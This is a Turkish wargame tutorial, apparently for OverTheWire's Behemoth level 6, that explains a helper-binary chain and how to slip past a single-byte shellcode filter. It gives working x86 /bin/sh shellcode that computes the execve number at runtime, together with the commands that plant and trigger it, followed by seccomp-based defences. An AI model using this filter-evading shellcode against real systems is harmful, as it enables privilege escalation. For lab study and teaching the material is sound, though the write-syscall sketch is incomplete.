# Modül 6 — Helper Binary Zinciri ve Dosya Tabanlı Shellcode

> **İlgili Seviye:** Behemoth6  
> **Anahtar Kavramlar:** Helper binary, shellcode filtresi, dosya tabanlı exploit, syscall kısıtlaması  
> **Kazanım:** İki binary'nin birlikte çalıştığı bir zinciri analiz edip exploit etmek

---

## 🧠 1. Büyük Resim (Konsept Nedir?)

Şimdiye kadar tek bir binary ile uğraştık. Behemoth6'da ise iki binary var: biri diğerini çağırıyor. Bu "helper binary" (yardımcı binary) deseni gerçek dünyada son derece yaygındır — büyük uygulamalar genellikle küçük yardımcı programlara iş devreder.

Bunu bir fabrika hattı gibi düşün: ana makine (behemoth6) hammaddeyi işlemek için yardımcı bir makineye (behemoth6_reader) gönderir. Yardımcı makine hammaddeyi (shellcode dosyası) bir konveyör banttan alır ve çalıştırır. Saldırgan olarak senin işin: konveyör bandın aldığı hammaddeyi kontrol etmek.

Ama bir twist var: yardımcı binary shellcode'u körü körüne çalıştırmaz — belirli byte'ları **filtreler**. Filtreyi aşmak bu seviyenin asıl zorluğudur.

---

## 🔍 2. Zafiyetin Anatomisi (Neden Kaynaklanıyor?)

### İki binary'nin zinciri

```bash
behemoth6@behemoth:~$ ls /behemoth/
behemoth6  behemoth6_reader
```

```bash
behemoth6@behemoth:~$ ltrace /behemoth/behemoth6 2>&1
system("/behemoth/behemoth6_reader")   # ana binary helper'ı çağırıyor
```

```bash
behemoth6@behemoth:~$ ltrace /behemoth/behemoth6_reader 2>&1
fopen("/tmp/behemoth6/shellcode", "rb")  # helper dosyadan shellcode okuyor
```

Zincir şöyle:

```
behemoth6 (SUID)
     │
     │ system() çağrısı
     ▼
behemoth6_reader
     │
     │ fopen("/tmp/behemoth6/shellcode", "rb")
     ▼
Dosyadaki shellcode → çalıştır
```

### `behemoth6_reader` ne yapıyor?

Binary shellcode'u okuduktan sonra her byte'ı kontrol eder. Eğer `0x0b` byte'ını görürse (Linux x86'da `execve` syscall numarası = 11 = 0x0b) programı durdurur:

```
"Write your own shellcode."
```

Bu neden önemli? Standart `/bin/sh` shellcode'umuz şu komutla biter:

```asm
mov al, 11      ; \xb0\x0b  ← 0x0b burada! execve syscall
int 0x80        ; \xcd\x80
```

`0x0b` filtrelenince doğrudan shell açamayız.

### Filtreyi aşma — alternatif syscall

`execve` yerine `write` syscall'ı kullanabiliriz. Hedef: shell açmak yerine `/etc/behemoth_pass/behemoth7` dosyasının içeriğini stdout'a yazdırmak.

```asm
; write(1, "/etc/behemoth_pass/behemoth7 içeriği", n)
; syscall numarası: 4 (0x04) — 0x0b değil, filtreden geçer!

xor  eax, eax
xor  ebx, ebx
xor  ecx, ecx
xor  edx, edx
mov  al, 0x4       ; write syscall = 4
mov  bl, 0x1       ; fd = 1 (stdout)
pop  ecx           ; mesaj adresi
mov  dl, 0xa       ; uzunluk
int  0x80          ; yaz

xor  eax, eax
mov  al, 0x1       ; exit syscall = 1
xor  ebx, ebx
int  0x80
```

Ya da daha pratik bir yaklaşım: `0x0b` byte'ını runtime'da hesapla:

```asm
; 0x0b'yi doğrudan yazmak yerine hesapla
xor  eax, eax
mov  al, 0x0c      ; 12
dec  al            ; 12 - 1 = 11 (0x0b) — ama binary'de 0x0b byte'ı yok!
int  0x80
```

Bu trick sayesinde shellcode içinde `0x0b` byte'ı **hiç geçmez** ama çalışınca `eax = 11 = execve` olur.

### Shellcode'u dosyaya yazmak

```bash
mkdir -p /tmp/behemoth6

# 0x0b içermeyen alternatif shellcode
python3 -c "
import sys
# execve shellcode — 0x0b hesaplanarak elde ediliyor
shellcode = (
    b'\x31\xc0'         # xor eax, eax
    b'\x50'             # push eax (null)
    b'\x68\x2f\x2f\x73\x68'  # push '//sh'
    b'\x68\x2f\x62\x69\x6e'  # push '/bin'
    b'\x89\xe3'         # mov ebx, esp
    b'\x50'             # push eax
    b'\x53'             # push ebx
    b'\x89\xe1'         # mov ecx, esp
    b'\x99'             # cdq (edx = 0)
    b'\xb0\x0c'         # mov al, 12
    b'\xfe\xc8'         # dec al  → al = 11 = execve (0x0b yok!)
    b'\xcd\x80'         # int 0x80
)
sys.stdout.buffer.write(shellcode)
" > /tmp/behemoth6/shellcode

# Doğrula — 0x0b byte'ı olmamalı
xxd /tmp/behemoth6/shellcode | grep ' 0b'
# Çıktı boşsa → güvenli

# Binary'yi çalıştır
/behemoth/behemoth6
```

---

## 🛠️ 3. Defansif Bakış Açısı (Nasıl Düzeltilir?)

### Shellcode filtresinin yetersizliği

`behemoth6_reader`'ın uyguladığı filtre (sadece `0x0b` kontrolü) gerçek bir güvenlik mekanizması değildir. Sorunlar:

**Tek byte kontrol etmek yeterli değildir.** Saldırgan değeri runtime'da hesaplayabilir (`dec al`, `xor + add` gibi yöntemlerle). Tüm olası kombinasyonları engellemek imkânsızdır.

**Dosyadan shellcode okumak ve çalıştırmak kökten yanlıştır.** Güvenli alternatifler:

```c
// Kötü: dosyadan oku, belleğe yaz, çalıştır
void (*fn)() = (void(*)())shellcode;
fn();

// İyi: çalıştırılabilir bellek alanı hiç tahsis etme
// Kullanıcı girdisini komut olarak hiç çalıştırma
// Gerekiyorsa: seccomp ile izin verilen syscall'ları kısıtla
```

### seccomp ile syscall kısıtlama

Linux'ta `seccomp` (secure computing mode) ile bir programa izin verilen syscall'ları beyaz listeyle sınırlayabilirsin:

```c
#include <sys/prctl.h>
#include <linux/seccomp.h>

// Sadece read, write, exit'e izin ver — execve yasak
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
```

Bu durumda saldırgan shellcode içinde `execve` çağırsa bile kernel bunu reddeder ve programı öldürür.

---

## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar

### Tuzak 1 — Standart shellcode'u doğrudan kullanmak

Modül 4'teki shellcode'u `0x0b` filtresi fark etmeden kopyalayıp yapıştırmak en sık yapılan hata. Binary "Write your own shellcode." diyorsa bu filtreye takıldın demektir.

```bash
# Shellcode'unda 0x0b var mı kontrol et
xxd /tmp/behemoth6/shellcode | grep ' 0b'
# Çıktı varsa → filtreye takılacak, değiştir
```

### Tuzak 2 — Dizin izinleri

`/tmp/behemoth6/` dizinini oluşturmayı unutmak veya yanlış izinlerle oluşturmak:

```bash
# Dizin yoksa fopen başarısız olur
mkdir -p /tmp/behemoth6
chmod 777 /tmp/behemoth6   # herkes okuyabilsin
```

### Tuzak 3 — Shellcode'u metin olarak yazmak

```bash
# Yanlış — echo \x31 gerçek byte yazmaz, string yazar
echo "\x31\xc0..." > /tmp/behemoth6/shellcode

# Doğru — python3 ile ham byte yaz
python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0...')" > /tmp/behemoth6/shellcode

# Doğrula
xxd /tmp/behemoth6/shellcode | head -3
# 00000000: 31c0 5068 2f2f 7368 ...  ← ham byte görünmeli
```

### Tuzak 4 — ltrace ile helper binary'yi atlamak

`ltrace /behemoth/behemoth6` sadece ana binary'nin çağrılarını gösterir. Helper binary'nin ne yaptığını anlamak için:

```bash
# Helper'ı ayrıca analiz et
ltrace /behemoth/behemoth6_reader 2>&1
strings /behemoth/behemoth6_reader   # filtre mesajlarını gör
```

---

## Özet

```
behemoth6 (SUID)
     │
     └─► behemoth6_reader
               │
               ├─► /tmp/behemoth6/shellcode dosyasını oku
               │
               ├─► Her byte'ı kontrol et
               │     0x0b varsa → "Write your own shellcode." → çık
               │
               └─► Filtreyi geçen shellcode'u çalıştır

Saldırı:
  0x0b'yi doğrudan yazma → runtime'da hesapla (dec al: 0x0c → 0x0b)
  Shellcode'u ham byte olarak /tmp/behemoth6/shellcode'a yaz
  /behemoth/behemoth6'yı çalıştır

Savunma:
  Shellcode filtreleme → seccomp whitelist kullan
  Dosyadan shellcode okuma → mimari hatası, hiç yapma
```

---

## Kaynaklar

- [shell-storm.org — Linux/x86 shellcode veritabanı](http://shell-storm.org/shellcode/)
- [Linux seccomp(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [Linux syscall tablosu x86](https://syscalls32.paolostivanin.com/)
- `man 2 execve` — execve syscall detayları
